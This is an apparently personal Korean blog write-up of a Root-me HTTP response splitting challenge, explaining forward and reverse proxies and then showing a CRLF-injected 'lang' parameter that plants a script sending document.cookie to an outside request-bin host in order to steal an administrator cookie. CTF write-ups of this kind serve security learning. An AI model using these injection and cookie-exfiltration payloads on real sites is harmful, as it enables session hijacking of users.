---
title : HTTP Response Splitting (풀이 봄)
categories : [Wargame, Root-me]
tags : [HTTP Response Splitting, Incomplete, 풀이 봄]
---

## HTTP Response Splitting
<hr style="border-top: 1px solid;"><br>

```
Old vulnerability... but powerful !
Author
Arod,  7 November 2013

Statement
A new website is under construction. 
A reverse proxy cache has been implemented in front of the web server and developers
think they have a good security.

Show them they’re wrong by bringing us an administrator access !

The website is still in development and the administrator often logs in.

Note: this is an IPv4 only challenge (for now)
```

<br><br>
<hr style="border: 2px solid;">
<br><br>

## Forward Proxy / Reverse Proxy
<hr style="border-top: 1px solid;"><br>

Forward Proxy란?

클라이언트가 ```example.com``` 에 연결하려하면 사용자 PC가 직접 연결하는게 아니라, 포워드 프록시 서버가 요청을 받아서 ```example.com```에 연결하여 그 결과를 클라이언트에 전달(forward)해준다.

포워드 프록시는 대개 캐싱 기능이 있으므로 자주 사용되는 컨텐츠라면 월등한 성능 향상을 가져올 수 있으며, 정해진 사이트만 연결하게 설정하는 등 웹 사용 환경을 제한할 수 있으므로 기업 환경 등에서 많이 사용한다.

<br>

![image](https://user-images.githubusercontent.com/52172169/185041163-62abd9b5-80eb-4575-85bb-1bb328e61fda.png)

<br>

Reverse Proxy란?

클라이언트가 ```example.com``` 웹 서비스에 데이터를 요청하면 Reverse Proxy는 이 요청을 받아서 내부 서버에서 데이터를 받은 후에 이 데이터를 클라이언트에 전달하게 된다.

내부 서버가 직접 서비스를 제공해도 되지만 이렇게 구성하는 이유중 하나는 보안 때문이다.

보통 기업의 네트워크 환경은 DMZ 라고 하는 내부 네트워크와 외부 네트워크 사이에 위치하는 구간이 존재하며, 이 구간에는 메일 서버, 웹 서버, FTP 서버등 외부 서비스를 제공하는 서버가 위치하게 된다.

<br>

![image](https://user-images.githubusercontent.com/52172169/185041180-835b0698-b335-4cc5-ae74-3aa1d11b7328.png)

<br>

![image](https://user-images.githubusercontent.com/52172169/185043034-dafdd34e-5eec-4317-91f0-c87df848a966.png)

<br>

요약하면 위의 사진에서 위가 forward proxy, 아래가 reverse proxy라고 한다.

<br>

출처 
: <a href="https://www.lesstif.com/system-admin/forward-proxy-reverse-proxy-21430345.html" target="_blank">lesstif.com/system-admin/forward-proxy-reverse-proxy-21430345.html</a>
: <a href="https://exp-blog.com/safe/ctf/rootme/web-client/http-response-splitting/" target="_blank">exp-blog.com/safe/ctf/rootme/web-client/http-response-splitting/</a>

<br><br>
<hr style="border: 2px solid;">
<br><br>

## Solution
<hr style="border-top: 1px solid;"><br>

처음에 언어 선택하는 화면에서 언어를 선택하면 ```/user/param?lang=en```로 값을 주고 ```/home```으로 가게 됨.  

파라미터가 전달되는 언어 선택 창에서 공격을 실시.   

```/user/param?lang=en```에서 Response Header은 다음과 같음.  

<br>

```
HTTP/1.1 302 Found
Set-Cookie: lang=en; Expires=Mon, 06 Jul 2020 11:20:57 GMT; Path=/
Server: WorldCompanyWebServer
Connection: close
Location: /home
Date: Mon, 29 Jun 2020 11:20:57 GMT
Content-Type: text/html
Content-Length: 0
```  

<br>

문제에선 admin_cookie 값을 뽑아와야 되므로 XSS 공격문을 넣어줘야함.  

<br>

```
HTTP/1.1 302 Found
Set-Cookie: lang=en; Expires=Mon, 06 Jul 2020 11:20:57 GMT; Path=/
Server: WorldCompanyWebServer
Connection: close
Location: /home
Date: Mon, 29 Jun 2020 11:20:57 GMT
Content-Type: text/html
Content-Length: 0

--------추가한 부분---------

HTTP/1.1 200 OK
Content-Type: text/html
X-XSS-Protection: 0
Last-Modified: Mon, 21 Oct 2099 07:28:00 GMT 
Content-Length: 95

<script>location.href="http://iutvqnr.request.dreamhack.games?cookie="+document.cookie</script>
```

<br>

```
?lang=fr%0d%0a%0d%0aHTTP/1.1%20200%20OK%0d%0aContent-Type:%20text/html%0d%0aLast-Modified:%20Thu,%2001%20Jan%202099%2007:28:00%20GMT%0d%0aX-XSS-Protection:%200%0d%0a%20Content-Length:107%0d%0a%0d%0a<script>location.replace('http://aflylab.request.dreamhack.games?cookie='.concat(document.cookie))</script>
```

<br>

```
HTTP/1.1 302 Found
Set-Cookie: lang=fr
Server: WorldCompanyWebServer
Connection: close
Location: /home
Date: Wed, 17 Aug 2022 06:54:47 GMT
Content-Type: text/html
Content-Length: 290

HTTP/1.1 200 OK
Content-Type: text/html
Last-Modified: Thu, 01 Jan 2099 07:28:00 GMT
X-XSS-Protection: 0
 Content-Length:107

<script>location.replace('http://aflylab.request.dreamhack.games?cookie='.concat(document.cookie))</script>; Expires=Wed, 24 Aug 2022 06:54:47 GMT; Path=/
```

<br>

크롬에서는 안되는지.. 다른 브라우저로 해야하나..?

<br><br>
<hr style="border: 2px solid;">
<br><br>
